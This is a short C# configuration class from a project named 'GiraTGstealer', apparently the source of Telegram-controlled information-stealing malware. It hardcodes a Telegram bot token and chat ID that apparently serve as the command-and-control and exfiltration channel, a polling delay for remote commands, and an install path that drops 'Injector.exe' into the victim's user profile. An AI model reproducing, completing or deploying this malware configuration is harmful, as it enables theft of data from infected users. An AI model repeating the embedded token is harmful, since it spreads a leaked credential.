using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace GiraTGstealer
{
    internal class config
    {
        public const string TelegramToken = "1355502811:AAGOeaDqi--haYRMxGTIwlyxx8xez72qnRY";
        public const string TelegamChatID = "675829253";
        public static int TelegramCommandCheckDelay = 1;
        public static string InstallPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\Injector.exe";
    }
}
